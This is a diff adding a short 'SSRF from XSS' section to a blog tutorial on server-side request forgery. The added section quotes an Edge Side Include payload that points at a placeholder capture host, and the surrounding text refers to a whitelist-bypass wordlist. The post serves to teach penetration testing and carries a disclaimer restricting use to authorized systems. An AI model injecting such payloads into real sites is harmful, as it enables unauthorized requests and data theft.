@@ -217,6 +217,12 @@ into the {body} of the default.hbs template -->
 
 <p>A white list on the other hand will only allow submissions that contain certain strings. The key here is to include the expected domain as well as malicious one. Again on my <a href="https://github.com/0x221b/Wordlists/blob/master/Attacks/SSRF/Whitelist-bypass.txt">Github</a> I have a wordlist to attempt to circumvent these. It is set up for the local host but can be adapted for any. Some will only work if you are pointing it to a site you control.</p>
 
+<h3>SSRF from XSS</h3>
+
+<p>@georgeomnet posted an example of how to escalate an XSS to SSRF:</p>
+
+<p>&lt; esi:include src=”http ://site.com/capture” /&gt;</p>
+
 <h2>Disclaimer</h2>
 
 <p>As with all of these types of techniques these methods should only be used against systems you own or those you have express and written permission of the owner to test. It is illegal to use these techniques on systems in other cases.</p>
